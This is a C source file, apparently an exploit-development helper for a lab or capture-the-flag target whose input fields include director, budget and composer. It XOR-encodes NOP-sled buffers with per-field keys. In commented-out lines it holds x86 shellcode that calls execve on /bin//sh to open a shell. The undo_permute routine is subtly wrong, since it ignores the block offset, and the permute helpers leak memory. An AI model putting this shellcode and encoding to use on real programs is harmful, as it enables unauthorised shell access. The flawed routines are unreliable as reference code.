#include <stdlib.h>
#include <stdio.h>

void xor_field(char* field, const int fieldLen, const char* key, const int keyLen);
void permute_field(char* field, const int fieldLen, const int* perm, const int permLen);
void undo_permute(char* field, const int fieldLen, const int* perm, const int permLen);
void print_char_array(const char* array, int size);

int main(int argc, char* argv[])
{
    // director 300 - 6
    // int size = 6;
    //char field[6] = "\x90\x90\x90\x90\x90\x90";
    //char   key[6] = "\x26\xf8\x2b\xff\x7b\x2d";

    // star2 300 - 10
    //int size = 10;
    //char field[10] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[10] = "\xe7\x1e\x90\xa1\x80\x93\xb5\x83\x3a\xe4";

    // budget 80 - 4
    //int size = 4;
    //char field[4] = "\x90\x90\x90\x90";
    //char   key[4] = "\x63\x51\x13\xbe";

    // opening_weekend 80 - 80
    int size = 80;
    char field[80] = "\x90\x90\xeb\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char   key[80] = "\xd6\x22\x9a\x95\x9e\xb1\x65\xf5\x72\x1f\xd9\x2e\x71\x2e\x58\xae\xe8\x2e\x44\xe5\x44\xee\x5f\xd4\x86\xdc\x10\xd5\xe6\x70\x38\xac\xb0\x80\xd6\x79\x46\x96\x85\x0a\xac\x4f\x8c\xa9\xb7\x98\x2d\xab\x14\x1a\x8b\x26\x36\x1d\x3e\xb8\x4f\x21\xe5\xfe\xa3\xf7\xde\x26\xea\xdb\xe2\x67\xe0\xde\xca\xdc\x14\xbe\xa2\xff\x28\xd2\x8e\x14";

    // gross 80 - 20
    //int size = 20;
    //char field[20] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[20] = "\xcf\x1e\x33\x4a\x8f\x26\xcd\x8d\x86\x8c\x4e\x76\x3f\x1f\xa6\xe3\x2d\xa9\x85\xdd";

    // runtime 80 - 20
    //int size = 20;
    //char field[20] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[20] = "\xfc\x8c\xc7\x03\xe3\x5a\xad\x30\x0c\x2d\x4d\x1c\xee\x37\xb1\x51\x75\x99\xed\x96";

    // aspect 40 - 2
    //int size = 2;
    //char field[2] = "\x90\x90";
    //char   key[2] = "\xf1\xcd";

    // composer 300 - 15
    //int size = 15;
    //char field[15] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[15] = "\xa0\x31\x7b\xd5\xfd\xd9\xbc\x27\x03\xb4\x83\xb7\xf1\xba\xe7";

    // shellcode in composer 300 - 15
    //int size = 15;
    //char field[15] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68";
    //char field[15] = "\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
    //char   key[15] = "\xa0\x31\x7b\xd5\xfd\xd9\xbc\x27\x03\xb4\x83\xb7\xf1\xba\xe7";

    printf("Before xor:\n");
    print_char_array(field, size);

    xor_field(field, size, key, size);

    printf("After xor:\n");
    print_char_array(field, size);

    xor_field(field, size, key, size);

    printf("After undo xor:\n");
    print_char_array(field, size);


    //int size = 15;
    //char field[15] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //int key[15] = {13, 1, 0, 12, 2, 11, 4, 10, 14, 5, 8, 6, 3, 7, 9};

    /*
    int size = 200;
    char field[200] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x90\x90\x90\x90\x90";
    int key[200] = {191, 59, 91, 88, 103, 109, 157, 119, 35, 38, 80, 107, 99, 153, 49, 143, 
        100, 33, 36, 42, 135, 44, 56, 169, 194, 28, 172, 186, 189, 19, 16, 112, 51, 165, 53, 156, 181, 
        144, 136, 177, 128, 126, 159, 120, 68, 176, 5, 15, 29, 84, 21, 8, 31, 166, 193, 93, 116, 179, 
        87, 140, 17, 146, 75, 89, 97, 134, 161, 67, 46, 55, 122, 12, 76, 86, 174, 163, 168, 34, 24, 150, 
        158, 45, 30, 32, 138, 82, 63, 184, 131, 39, 9, 198, 121, 3, 105, 43, 199, 18, 14, 81, 149, 164, 
        118, 23, 71, 178, 190, 187, 57, 78, 129, 151, 106, 73, 141, 61, 98, 11, 192, 69, 60, 182, 160, 
        173, 117, 58, 108, 83, 48, 27, 124, 102, 22, 185, 79, 170, 66, 96, 104, 41, 123, 40, 197, 132, 
        180, 111, 20, 85, 54, 148, 101, 137, 113, 7, 65, 47, 142, 26, 25, 183, 6, 114, 162, 175, 37, 70, 
        92, 74, 13, 94, 154, 155, 115, 64, 1, 10, 50, 95, 152, 62, 4, 0, 77, 196, 133, 130, 147, 188, 2, 
        127, 139, 167, 171, 145, 90, 125, 110, 52, 72, 195};
        */

    /*
    printf("Before undo_permute:\n");
    print_char_array(field, size);

    undo_permute(field, size, key, size);

    printf("After under_permute::\n");
    print_char_array(field, size);

    permute_field(field, size, key, size);

    printf("After permute:\n");
    print_char_array(field, size);
    */

    return 0;
}

void permute_field(char* field, const int fieldLen, const int* perm, const int permLen)
{
    if(fieldLen % permLen != 0) {
        fprintf(stderr, "Error: permutation length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int permItr;  // Permutation iteration we're on. 
    char* tmp = malloc(permLen);  // A temporary field for our permutation.

    // For each time we are performing our permutation.
    for(permItr = 0; permItr < fieldLen / permLen; permItr++) {

        base = permItr * permLen;

        // tmp[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            tmp[index] = field[base + perm[index]];
        }

        // field[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            field[base + index] = tmp[index];
        }
    }
}

void undo_permute(char* field, const int fieldLen, const int* perm, const int permLen)
{
    if(fieldLen % permLen != 0) {
        fprintf(stderr, "Error: permutation length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int permItr;  // Permutation iteration we're on. 
    char* tmp = malloc(permLen);  // A temporary field for our permutation.

    // For each time we are performing our permutation.
    for(permItr = 0; permItr < fieldLen / permLen; permItr++) {

        base = permItr * permLen;

        // tmp[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            tmp[perm[index]] = field[index];
        }

        // field[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            field[base + index] = tmp[index];
        }
    }
}

void xor_field(char* field, const int fieldLen, const char* key, const int keyLen)
{
    if(fieldLen % keyLen != 0) {
        fprintf(stderr, "Error: key length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int keyItr;  // Key iteration we're on. 

    // For each time we use the xor key. 
    for(keyItr = 0; keyItr < fieldLen / keyLen; keyItr++) {

        base = keyItr * keyLen;

        for(index = 0; index < keyLen; index++) {
            field[base + index] ^= key[index];
        }
    }
}

void print_char_array(const char* array, int size)
{
    int i = 0;
    for(i = 0; i < size; i++) {
        printf(" %#.2x", array[i]); 
    }
    printf("\n");
}
